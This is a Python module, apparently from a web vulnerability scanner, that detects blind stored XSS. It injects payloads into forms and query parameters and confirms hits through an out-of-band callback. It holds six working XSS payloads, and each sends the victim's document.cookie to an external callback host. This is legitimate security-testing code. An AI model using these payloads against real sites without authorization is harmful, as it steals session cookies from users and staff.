"""
BlindXSSScanner — OOB-based stored/blind XSS detection.

Lifecycle:
  DETECTED:   (not applicable — requires OOB callback)
  VALIDATED:  (not applicable)
  EXPLOITABLE: (not applicable)
  VERIFIED:   OOB callback confirms payload execution

Maturity: Level 4 (OOB-confirmed)
"""

from urllib.parse import urlparse, parse_qs
from urllib.parse import urlencode as _urlencode

from modules.utils import (
    safe_get, safe_post, finding, log, Colors, _build_curl,
    VerificationStage,
)
from scanners.base import ScannerBase


class BlindXSSScanner(ScannerBase):
    SCANNER_NAME = "blind_xss"
    SCANNER_MATURITY = 4
    TARGET_LEVEL = True

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._oob_payloads: list[str] = []
        self._oob_urls: list[tuple[str, str, str]] = []

    def _build_payloads(self) -> list[str]:
        oob_host = self.validation.callback_host
        if not oob_host:
            return []
        token = self.validation.callback_url.split("//")[-1].split(".")[0] if hasattr(self.validation, "callback_url") else self.validation.generate_oob_payload().split("{")[0]
        token = token.replace(".", "")
        return [
            f'<script>fetch("http://{token}.{oob_host}/blind?c="+document.cookie)</script>',
            f'<img src=x onerror=fetch("http://{token}.{oob_host}/blind?c="+document.cookie)>',
            f'<svg/onload=fetch("http://{token}.{oob_host}/blind?c="+document.cookie)>',
            f'<input autofocus onfocus=fetch("http://{token}.{oob_host}/blind?c="+document.cookie)>',
            f'<body onload=fetch("http://{token}.{oob_host}/blind?c="+document.cookie)>',
            f'<script>new Image().src="http://{token}.{oob_host}/blind?c="+document.cookie</script>',
        ]

    def scan(self, target_urls: list[str] | None = None) -> list[dict]:
        oob_host = self.validation.callback_host
        if not oob_host:
            log("[!] Blind XSS skipped — provide --oob-host for OOB callback verification", Colors.YELLOW)
            return self._get_findings()

        self._oob_payloads = self._build_payloads()
        if not self._oob_payloads:
            return self._get_findings()

        for form in self.recon.get("forms", []):
            try:
                action = form.get("action", "")
                method = form.get("method", "get").upper()
                fields = form.get("fields", [])
                text_fields = [
                    f for f in fields
                    if f.get("type") in ("text", "textarea", "email", "url", "search", None)
                    and f.get("name")
                ]
                for field in text_fields[:3]:
                    for payload in self._oob_payloads:
                        data = {f["name"]: f.get("value", "test") for f in fields if f.get("name")}
                        data[field["name"]] = payload
                        if method == "POST":
                            safe_post(self.session, action, data, self.timeout, raise_for_status=False)
                        else:
                            safe_get(self.session, action + "?" + _urlencode(data),
                                     self.timeout, raise_for_status=False)
                        self.validation.register_oob("blind_xss", payload, action)
                        self._oob_urls.append(("blind_xss", payload, action))
            except Exception as e:
                log(f"  [Blind XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        for url in self.recon.get("urls", []):
            if not self._in_scope(url) or "?" not in url:
                continue
            for param in parse_qs(urlparse(url).query).keys():
                for payload in self._oob_payloads[:2]:
                    from urllib.parse import urlencode
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    qs[param] = [payload]
                    new_qs = urlencode(qs, doseq=True)
                    from urllib.parse import urlunparse
                    test_url = urlunparse(parsed._replace(query=new_qs))
                    safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                    self.validation.register_oob("blind_xss", payload, test_url)
                    self._oob_urls.append(("blind_xss", payload, test_url))

        return self._get_findings()

    def finalize(self) -> list[dict]:
        extra: list[dict] = []
        confirmed = self.validation.poll_oob()
        for ev in confirmed:
            payload_str = ev.callback_host or ""
            url_str = ""
            for vt, pl, u in self._oob_urls:
                if payload_str and payload_str in pl:
                    url_str = u
                    break
            f = finding(
                vuln_type="Blind XSS (Stored)",
                url=url_str,
                severity="critical",
                details="Blind XSS confirmed via OOB callback — payload executed by victim browser, callback received",
                evidence=f"Callback: {ev.raw_data[:200] if ev.raw_data else ''}",
                request=_build_curl("POST", url_str, dict(self.session.headers), data={"field": "(blind xss payload)"}) if url_str else "",
                response_excerpt="(confirmed via OOB callback — JavaScript executed in victim browser)",
                verification_stage=VerificationStage.VERIFIED.value,
                steps_to_reproduce=[
                    f"Inject Blind XSS payload into form field at {url_str}",
                    "When victim/staff views the stored content, the payload executes",
                    "Observe OOB callback containing victim's cookie, session, or page content",
                ],
            )
            if f:
                self.evidence_engine.store(ev)
                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                self._add_finding(f)
                extra.append(f)
            log(f"  [Blind XSS OOB] {url_str}", Colors.RED, verbose_only=True, verbose=self.verbose)
        return extra
